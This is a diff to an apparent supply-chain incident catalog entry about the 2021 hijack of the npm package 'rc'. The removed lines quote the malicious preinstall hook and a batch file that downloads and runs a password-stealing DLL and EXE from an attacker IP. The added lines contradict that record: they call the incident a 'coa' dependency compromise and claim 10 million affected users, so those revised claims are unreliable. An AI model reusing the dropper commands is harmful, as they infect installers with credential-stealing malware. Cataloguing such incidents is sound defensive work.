@@ -1,51 +1,22 @@
 - name: rc
-  title: npm package rc compromised, distributed password-stealing malware.
-  start_date: 2021-11-04
-  end_date: 2021-11-05
-  license: Multiple (BSD, MIT, Apache) # Uses multiple permissive licenses
-  website: https://github.com/dominictarr/rc
-  repo: https://github.com/dominictarr/rc
-  attribution_type: unknown
-  component_type: Library # Configuration loader
+  title: rc NPM package includes malicious coa dependency
+  synopsis: The 'rc' configuration loader NPM package was compromised indirectly. Attackers gained control of the 'coa' package (a dependency) and published malicious versions. When 'rc' was updated to use these compromised 'coa' versions, 'rc' itself began distributing password-stealing malware transitively.
+  start_date: 2021-11-04 # Date coa compromise impacted rc
+  end_date: 2021-11-05 # Malicious versions removed
+  attribution_type: Individual hacker # Same actor as coa compromise
+  component_type: Library
   lang: Javascript
-  cause: compromise # npm account takeover
-  motive: credential theft / financial gain
-  attack_vector: account takeover # npm credentials compromised
-  transitive: false
-  insertion_phase: distribution # Malicious versions published to npm
-  impact_type: credential theft / malware dropper
-  impact_user_count: 50000 # Estimate based on ~14M weekly downloads, short timeframe
+  cause: Dependency compromise # Malicious coa dependency added
+  motive: Credential theft
+  transitive: true
+  insertion_phase: dependency # Malicious dependency specified
+  impact_type: Credential theft
+  impact_user_count: 10000000 # Based on weekly downloads of rc
   references:
-    - https://github.com/dominictarr/rc/pull/112 # Issue discussion
-    - https://blog.npmjs.org/post/667081714371166208/incident-report-npm-maintainer-account
-    - https://www.bleepingcomputer.com/news/security/popular-npm-library-hijacked-to-install-password-stealers-miners/
-    - https://jfrog.com/blog/coa-and-rc-npm-packages-hijacked-to-spread-malware/
+    - https://github.com/advisories/GHSA-g2q5-5433-rhr4
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-43174
+    - https://therecord.media/malware-found-in-npm-packages-coa-and-rc/
   versions:
-    - "1.2.9"
-    - "1.3.9"
-    - "2.3.9"
-  artifacts:
-    - "npm package rc@1.2.9, rc@1.3.9, etc. (Malicious, removed)"
-  impacted_hashes: # SHA256 of malicious package tarballs
-    - "5139454d6a04129c2b712684a9586808266315b9757a8b43fc66c6b9e25f0565" # rc-1.2.9.tgz
-  synopsis: Attacker compromised the npm maintainer account for the popular 'rc' library alongside 'coa'. Malicious versions were published containing scripts to download and execute Windows password-stealing malware.
-  compromise_desc: An attacker gained unauthorized access to the npm account of the maintainer for the `rc` package (and the related `coa` package), likely via credential reuse or phishing. Using this access on November 4th, 2021, they published several new versions of `rc` to the npm registry. These malicious versions included a `preinstall` script in `package.json` designed to execute platform-specific batch (`compile.bat`) or shell (`compile.sh`) scripts, identical to those found in the compromised `coa` package.
-  impact_desc: When developers installed one of the malicious `rc` versions using npm, the `preinstall` script automatically executed `compile.bat` (on Windows) or `compile.sh`. The Windows batch file used `curl` to download two files (`oracle_format.dll`, `oracle_format.exe`) from an attacker-controlled server and executed them. The DLL was identified as the DanaBot/Ursnif password-stealing trojan. Users whose Windows systems executed this batch file were likely infected with information-stealing malware. The shell script was reportedly non-functional. The malicious packages were removed by npm on November 5th, 2021.
-  example_code: |
-    // package.json snippet from malicious rc versions
-    "scripts": {
-      "preinstall": "node compile.js" // Runs compile.js which runs compile.bat/.sh
-    },
-
-    // Content of compile.bat in malicious rc package (same as coa)
-    @echo off
-    set file=C:\Users\Public\oracle_format.dll
-    set file2=C:\Users\Public\oracle_format.exe
-
-    curl -o %file% hxxp://159.148.186.228:8080/oracle_format.dll --insecure
-    regsvr32 %file% /s
-
-    curl -o %file2% hxxp://159.148.186.228:8080/oracle_format.exe --insecure
-    start %file2%
-
-    exit
+    - 1.2.9
+    - 1.3.9
+    - 2.3.9
